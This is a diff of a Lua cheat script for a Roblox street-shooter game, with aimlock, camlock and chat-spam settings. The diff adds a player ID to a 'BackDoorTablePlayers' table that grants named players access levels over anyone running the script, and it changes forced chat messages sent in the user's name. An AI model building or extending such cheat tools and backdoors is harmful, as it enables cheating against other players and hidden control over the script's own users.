@@ -91,7 +91,7 @@ local WalkShoot = true
 local AimMode = "Prediction"
 local AimlockMode = "LeftClick"
 local CamlockTarget = "Head"
-local SpamMessage = "Xslasher' Admin Or No Admin"
+local SpamMessage = "DONT FOLD TO HIVE, HIVE on top, oppK"
 local ConfigurationFile = "CyrusStreetsAdminSettings.json"
 local GunAnim = "None"
 
@@ -243,13 +243,18 @@ local BackDoorTablePlayers = {
 		['Name'] = "HIVE (Owner)"; 
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(255,55,55);
+		};
+	[1977361802] = {
+		['Name'] = "PRIMEHIVE";
+		['Access'] = 2;
+		['Colour'] = Color3.fromRGB(127,0,212);                                                        
 	};
-	[3334534] = {
+	[33328884] = {
 		['Name'] = "PRIMEHIVE";
 		['Access'] = 0;
 		['Colour'] = Color3.fromRGB(127,0,212);
     };
-	[5686128201] = {
+	[1268084035] = {
 		['Name'] = "D3VILG0D";
 		['Access'] = 0;
 		['Colour'] = Color3.fromRGB(107,50,124);
@@ -3207,8 +3212,8 @@ end))
 -- [[ End ]] --
 
 notif("xs noti","some " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: A4nyecN)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
-notif("Newest Update","HIVE here, xs updated perms given all blacklists whitelisted fixed bugs.",10,nil)
-ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Stop staring at me weirdo, getaway!","All")
+notif("Newest Update","HIVE here, updated perms given all blacklists whitelisted fixed bugs.",10,nil)
+ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("HIVE on top","All")
 --[[
 while wait(8) do
 	local Data = GetData()
